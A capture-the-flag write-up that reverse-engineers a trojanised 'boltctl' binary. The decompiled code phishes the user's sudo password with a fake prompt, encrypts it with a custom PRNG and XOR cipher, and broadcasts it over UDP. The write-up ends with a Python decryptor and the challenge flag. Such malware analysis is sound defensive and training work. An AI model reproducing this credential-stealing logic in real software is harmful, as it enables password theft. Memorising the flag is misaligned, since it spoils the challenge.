# Crowdstrike Adversary Quest 2022 / Tabloid Jackal / #3 Password

## Challenge Description

As your investigation revealed TABLOID JACKAL gained access to the laptop of the managing editor by exploiting their spellcheck service, but that would yield only user-privileged access. This level of privilege does not carry much risk. We did get a copy of the managing editor’s home directory for you though to find out whether the threat was fully removed.

Note: Flags will be easily identifiable by the format “CS{some_secret_flag_text}”. They must be submitted in full, including “CS{“ and “}”.

## TL;DR Summary

- A binary called boltctl was executed in the context of the managing editor
- That binary tricked the user into entering their (sudo) password by mimicking a sudo password prompt
- The encrypted password is sent as a payload in an IPV4 broadcast packet
- The encryption is based on a custom PRNG and a single byte XOR cipher

## Analysis

The challenge file is a .tar.gz archive that seems to contain the contents of the linux home directory for user jsmith.

The Zshell history file **.zsh_history** contains suspiciously looking executions of a binary named **boltctl**.

```console
└─$ cat ../../jsmith/.zsh_history 
: 1646988394:0;sudo boltctl 3294cbf3-7a11-d400-ffff-ffffffffffff
: 1646902640:0;sudo boltctl 3294cbf3-7a11-d400-ffff-ffffffffffff
: 1646816263:0;sudo boltctl 3294cbf3-7a11-d400-ffff-ffffffffffff
: 1646814704:0;sudo mount /dev/sda1 /mnt/usbstick
: 1646728522:0;sudo boltctl 3294cbf3-7a11-d400-ffff-ffffffffffff
: 1646643462:0;sudo boltctl 3294cbf3-7a11-d400-ffff-ffffffffffff
: 1646381646:0;sudo boltctl 3294cbf3-7a11-d400-ffff-ffffffffffff
: 1646642312:0;sudo mount /dev/sda1 /mnt/usbstick
: 1646294880:0;sudo boltctl 3294cbf3-7a11-d400-ffff-ffffffffffff
: 1646206709:0;sudo boltctl 3294cbf3-7a11-d400-ffff-ffffffffffff
: 1646464975:0;sudo mount /dev/sda1 /mnt/usbstick
: 1646119074:0;sudo boltctl 3294cbf3-7a11-d400-ffff-ffffffffffff
: 1646033482:0;sudo boltctl 3294cbf3-7a11-d400-ffff-ffffffffffff
: 1646207621:0;sudo mount /dev/sda1 /mnt/usbstick
```

Boltctl is a binary residing in **.bins/** in jsmith's home directory. It is a 64 Bit ELF linux executable.

```txt
└─$ ls -la .bins/boltctl 
-rwxr-xr-x 1 501 dialout 149824 Jul 15 04:57 .bins/boltctl
                                                                                                                                                                                                                      
┌──(kali㉿kali)-[/mnt/…/tabloid jackal/3 Password/Password/jsmith]
└─$ file .bins/boltctl 
.bins/boltctl: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d805df25a0bd973421bf6fba8176254e5c0e35a0, for GNU/Linux 4.4.0, stripped
```

There is also a PCAP file in **.sensor**, containing a single packet.

```console
└─$ xxd hit_01.pcap        
00000000: d4c3 b2a1 0200 0400 0000 0000 0000 0000  ................
00000010: 0000 0400 0100 0000 2353 3862 9958 0a00  ........#S8b.X..
00000020: 5e00 0000 5e00 0000 ffff ffff ffff f8ac  ^...^...........
00000030: 65fe 6654 0800 4500 0050 238f 4000 4011  e.fT..E..P#.@.@.
00000040: a44e c0a8 b217 ffff ffff a44a 076d 003c  .N.........J.m.<
00000050: 730d 6963 6164 6762 636e 6f64 696d 646a  s.icadgbcnodimdj
00000060: 6265 6f6b 626e 6e6b 616a 6c63 6f6a 6162  beokbnnkajlcojab
00000070: 6c6b 6963 6265 646a 6d6d 686e 6b6c 626a  lkicbedjmmhnklbj
00000080: 6262 6f6c 6a6b                           bboljk
```

A first guess would be, that the packet's payload `icadgbcnodimdjbeokbnnkajlcojablkicbedjmmhnklbjbboljk` could be the encrypted flag. The payload is 52 characters long.

## Reverse Engineering boltctl

So let's take apart boltctl starting its main function.

### Function main_1C2D

```c
__int64 __fastcall main_1C2D(int argc, char **argv, char **envp)
{
  memcpy(payload, &payload_ELF, 137913uLL);
  [...]
  seed = time(0LL);
  srand(seed);
  strcpy(drop_path, "/tmp");
  for ( i = 0LL; i <= 5; ++i )
    drop_path[i + 5] = rand() % 26 + 'a';
  if ( !drop_ELF_payload_1AEC(drop_path, payload, 137913LL) )
  {
    prompt_SUDO_password_and_send_1A31();
    execvp(drop_path, argv);
  }
  return 0LL;
}
```

Function **main_1C2D()** will

- Drop an embedded ELF binary to a temporary file on disk
- Call function **prompt_SUDO_password_and_send_1A31()**
- Execute the dropped ELF binary from disk with the same command line arguments as boltctl was startet with.

### Function prompt_SUDO_password_and_send_1A31

```c
__int64 prompt_SUDO_password_and_send_1A31()
{
  str_SUDO_USER = string_decrypt_1B61(&enc_SUDO_USER, 9uLL);
  env_SUDO_USER = getenv(str_SUDO_USER);
  if ( !env_contains_SUDO_vars_1329() )
    return 0LL;
  if ( get_syscw_from_ppid_13D4() )
  {
    sleep(1u);
    str_Sorry_try_again = string_decrypt_1B61(&enc_Sorry_try_again, 0x11uLL);
    puts(str_Sorry_try_again);
  }
  str_sudo_password_for = string_decrypt_1B61(&enc_sudo_password_for, 0x18uLL);
  printf(str_sudo_password_for, env_SUDO_USER);
  sudo_password = read_input_line_1514();
  encrypt_and_send_182B(sudo_password);
  return 0LL;
}
```

What this function basically does is

- Query entry for SUDO_USER from the environment variables
- Return prematurely if call to function **env_contains_SUDO_vars_1329()** returns false, which in turn queries for the existance of SUDO_COMMAND, SUDO_USER, SUDO_UID and SUDO_GID from the environment variables
- Print the string _Sorry, try again_ if a certain syscall write threshhold of the parent process is met
- Prints _[sudo] password for %s:_ with %s being the username.
- This way boltctl tries to lure the user into entering their (sudo) password by mimicking sudo behaviour.
- The password is read via function **read_input_line_1514()**.
- The password is then encrypted and send over the network via function **encrypt_and_send_182B()**.

Executing the binary debug run with SUDO_USER set to `hans`, boltctl will simulate sudo password entering

```txt
Sorry, try again.
[sudo] password for hans: 
```

### Function encrypt_and_send_182B

```c
unsigned __int64 __fastcall encrypt_and_send_182B(const char *sudo_password)
{
  [...]
  PRNG_state_value_1 = 0x43525744;
  PRNG_state_value_2 = 0x159A55A0;
  PRNG_state_value_3 = 0x1F123BB5;
  PRNG_state_value_4 = 0x74CBB1;
  for ( i = 0LL; i <= 0xF; ++i )
    alpha_for_nibble_values[i] = i + 'a';
  for ( j = 0LL; ; ++j )
  {
    len_sudo_password = strlen(sudo_password);
    if ( j >= len_sudo_password )
      break;
    random = PRNG_with_state_1651(&PRNG_state_value_1, &PRNG_state_value_2, &PRNG_state_value_3, &PRNG_state_value_4);
    XOR_key = BYTE2(random) ^ HIBYTE(random);
    XOR_key ^= BYTE1(random);
    XOR_key ^= (unsigned __int8)random;
    sendBuffer[2 * j] = alpha_for_nibble_values[((XOR_key ^ sudo_password[j]) >> 4) & 0xF];
    sendBuffer[2 * j + 1] = alpha_for_nibble_values[((unsigned __int8)XOR_key ^ sudo_password[j]) & 0xF];
  }
  send_data_1714(sendBuffer);
}
```

There are major takeaways from this function

- Each password character byte value is XOR'd with a key byte derived from output of a custom PRNG
  - The key byte is calculated as a chained XOR operation on each of the lower four bytes of the PRNG value `XOR_key =  (random & 0xff000000) >> 24 ^ (random & 0xff0000) >> 16 ^ (random & 0xff00) >> 8 ^ (random & 0xff)`.
- Each encrypted character is split into its nibble value (half-bytes) and each nibble is encoded in a lower case character a..p for the values 0..15

The password is then sent as the payload of a broadcast IPv4 packet on the network via function **send_data_1714()**.

```c
__int64 __fastcall send_data_1714(const char *sendBuffer)
{
  optval = 1;
  retval = 0;
  sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
  if ( sockfd == -1 )
    return 0xFFFFFFFFLL;
  if ( setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &optval, 4u) )
  {
    retval = -1;
  }
  else
  {
    memset(&s, 0, sizeof(s));
    s.sin_family = AF_INET;
    s.sin_port = htons(1901u);
    s.sin_addr.s_addr = htonl(INADDR_BROADCAST);
    lenSendBuffer = strlen(sendBuffer);
    if ( sendto(sockfd, sendBuffer, lenSendBuffer, 0, (const struct sockaddr *)&s, 0x10u) == -1 )
      retval = -1;
  }
  close(sockfd);
  return retval;
}
```

So we now know for sure, that the payload in the file **.sensor/hit_01.pcap** is the encrypted user password.

### Decryption Approach

We already know from function **encrypt_and_send_182B()** above, that each password character is XOR'd with an XOR key derived from the (integer) value of a custom PRNG.

Now we need to clone the PRNG from function **PRNG_with_state_1651()**.

```c
_QWORD __fastcall PRNG_with_state_1651(_DWORD *PRNG_state_value_1, _DWORD *PRNG_state_value_2, _DWORD *PRNG_state_value_3, _DWORD *PRNG_state_value_4)
{
  _QWORD temp;
  *PRNG_state_value_1 = 69069 * *PRNG_state_value_1 + 12345;
  *PRNG_state_value_2 ^= *PRNG_state_value_2 << 13;
  *PRNG_state_value_2 ^= *PRNG_state_value_2 >> 17;
  *PRNG_state_value_2 ^= 32 * *PRNG_state_value_2;
  temp = 698769069LL * *PRNG_state_value_3 + *PRNG_state_value_4;
  *PRNG_state_value_4 = HIDWORD(temp);          // >>20
  *PRNG_state_value_3 = temp;
  return (*PRNG_state_value_2 + *PRNG_state_value_1 + *PRNG_state_value_3);
}
```

Payload decryption can now be achieved by decoding each cipher byte from its two character nibble encoding and XOR'ing it with the XOR key derived from the cloned PRNG.

### Implementation

```python
class PRNG_with_state_1651(object):
  def __init__(self, PRNG_state_value_1, PRNG_state_value_2, PRNG_state_value_3, PRNG_state_value_4):
    self.PRNG_state_value_1 = PRNG_state_value_1
    self.PRNG_state_value_2 = PRNG_state_value_2
    self.PRNG_state_value_3 = PRNG_state_value_3
    self.PRNG_state_value_4 = PRNG_state_value_4

  def next(self):
    self.PRNG_state_value_1 = (69069 * self.PRNG_state_value_1 + 12345) & 0xffffffff
    self.PRNG_state_value_2 ^= (self.PRNG_state_value_2 << 13) & 0xffffffff
    self.PRNG_state_value_2 ^= (self.PRNG_state_value_2 >> 17) & 0xffffffff
    self.PRNG_state_value_2 ^= (32 * self.PRNG_state_value_2) & 0xffffffff
    temp = 698769069 * self.PRNG_state_value_3 + self.PRNG_state_value_4
    self.PRNG_state_value_4 = temp >> 0x20
    self.PRNG_state_value_3 = temp & 0xffffffff
    return ((self.PRNG_state_value_2 + self.PRNG_state_value_1 + self.PRNG_state_value_3) & 0xffffffff)

def decrypt(buffer):
  PRNG = PRNG_with_state_1651(0x43525744, 0x159a55a0, 0x1f123bb5, 0x74cbb1)
  payload = bytearray()
  for j in range(len(buffer) >> 1):
    random = PRNG.next()
    XOR_key = (random & 0xff000000) >> 24 ^ (random & 0xff0000) >> 16 ^ (random & 0xff00) >> 8 ^ (random & 0xff)
    high_nibble = ord(chr(buffer[j * 2])) - ord('a')
    low_nibble = ord(chr(buffer[j * 2 + 1])) - ord('a')
    cipher_char = (high_nibble << 4) + low_nibble
    payload.append(XOR_key ^ cipher_char)
  return (payload)

print(decrypt(b"icadgbcnodimdjbeokbnnkajlcojablkicbedjmmhnklbjbboljk"))

```

## Now it's Flag Time

```console
$ ./decrypt.py 
bytearray(b'CS{l34k1ng_r00t_p4ssw0rd}\n')
```

Flag: **CS{l34k1ng_r00t_p4ssw0rd}**
